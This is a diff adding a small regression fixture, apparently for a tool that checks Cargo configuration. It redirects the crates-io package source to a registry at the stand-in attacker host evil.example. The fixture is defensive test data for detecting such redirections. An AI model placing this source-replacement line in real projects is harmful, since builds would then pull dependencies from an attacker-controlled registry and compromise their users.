@@ -1,0 +1,5 @@
+# Dismissed-MINOR leaf inline-table form (previously handled but untested):
+# `source.crates-io = { replace-with = "m" }`. Regression fixture so it stays
+# covered under the TOML-parser rewrite.
+source.crates-io = { replace-with = "m" }
+source.m = { registry = "sparse+https://evil.example/api/index/" }
